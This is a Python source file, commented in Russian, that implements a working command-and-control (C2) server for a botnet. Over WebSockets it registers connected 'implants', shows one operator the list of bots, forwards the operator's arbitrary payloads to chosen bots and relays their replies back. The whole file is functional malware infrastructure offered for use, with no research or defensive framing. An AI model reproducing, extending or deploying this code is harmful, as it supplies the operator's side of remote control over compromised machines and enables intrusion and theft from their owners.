import asyncio
import os
from aiohttp import web

# ==============================================================================
# ГЛОБАЛЬНОЕ СОСТОЯНИЕ СЕРВЕРА
# ==============================================================================

# Словарь для хранения активных имплантов: {'implant_id': websocket}
IMPLANTS = {}
# Переменная для хранения единственного оператора
OPERATOR = None

# ==============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ==============================================================================

async def broadcast_bot_list():
  """
  Рассылает обновленный список ботов ТОЛЬКО ЕСЛИ оператор на месте.
  Это исправленная, стабильная версия.
  """
  # <<< ГЛАВНЫЙ ФИКС: ПРОВЕРЯЕМ, ЖИВ ЛИ ОПЕРАТОР ПЕРЕД ОТПРАВКОЙ
  if OPERATOR and not OPERATOR.closed:
    bot_ids = list(IMPLANTS.keys())
    print(f"[*] Обновление списка ботов для оператора: {bot_ids}")
    try:
      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
    except (ConnectionResetError, asyncio.CancelledError):
      print("[!] Оператор отключился во время отправки списка ботов.")
  else:
    print("[*] Список ботов изменился, но оператор не в сети. Отправка отменена.")

# ==============================================================================
# ОБРАБОТЧИКИ HTTP И WEBSOCKET
# ==============================================================================

async def handle_index(request):
  """Отдаёт нашу HTML-панель управления."""
  return web.FileResponse('./index.html')

async def websocket_handler(request):
  """Главный обработчик WebSocket соединений."""
  ws = web.WebSocketResponse()
  await ws.prepare(request)

  client_type = None
  client_id = None
  global OPERATOR

  try:
    # Основной цикл прослушивания сообщений от клиента
    async for msg in ws:
      if msg.type == web.WSMsgType.TEXT:
        data = msg.json()
        msg_type = data.get('type')

        # --- ЭТАП 1: Идентификация клиента ---
        if client_type is None:
          if msg_type == 'operator':
            client_type = 'operator'
            OPERATOR = ws
            print("[+] Оператор подключился.")
            await broadcast_bot_list() # Сразу отправляем список ботов
            continue

          elif msg_type == 'implant':
            client_type = 'implant'
            client_id = data.get('id')
            if client_id:
              IMPLANTS[client_id] = ws
              print(f"[+] Новый имплант в сети: {client_id}")
              await broadcast_bot_list()
            # Пересылаем начальные данные оператору
            if OPERATOR and not OPERATOR.closed:
              await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': data})
            continue

        # --- ЭТАП 2: Маршрутизация сообщений ---
        if client_type == 'operator':
          target_id = data.get('target_id')
          payload = data.get('payload')
          if target_id in IMPLANTS:
            target_ws = IMPLANTS[target_id]
            if not target_ws.closed:
              await target_ws.send_json(payload)
            else: # Если бот отвалился, а оператор этого еще не знает
              del IMPLANTS[target_id]
              await broadcast_bot_list()
          else:
            await OPERATOR.send_json({'type': 'status', 'data': f"Ошибка: бот {target_id} не в сети."})

        elif client_type == 'implant':
          # Просто пересылаем всё от импланта оператору, добавляя ID отправителя
          if OPERATOR and not OPERATOR.closed:
              # Добавляем ID бота, чтобы фронтенд знал, от кого пришло сообщение
              data['bot_id'] = client_id
              await OPERATOR.send_json(data)

  except asyncio.CancelledError:
    print(f"[-] Соединение с {client_id or 'клиентом'} было принудительно разорвано.")
  finally:
    # --- ЭТАП 3: Очистка после отключения ---
    if client_type == 'operator':
      OPERATOR = None
      print("[-] Оператор отключился.")
    elif client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] Имплант отключился: {client_id}")
      await broadcast_bot_list() # Обновляем список у оператора

  return ws

# ==============================================================================
# ЗАПУСК СЕРВЕРА
# ==============================================================================

app = web.Application()
app.router.add_get('/', handle_index)
app.router.add_get('/ws', websocket_handler)

if __name__ == '__main__':
  port = int(os.environ.get("PORT", 8080))
  web.run_app(app, host='0.0.0.0', port=port)
  print(f"C2 сервер запущен на порту {port}")
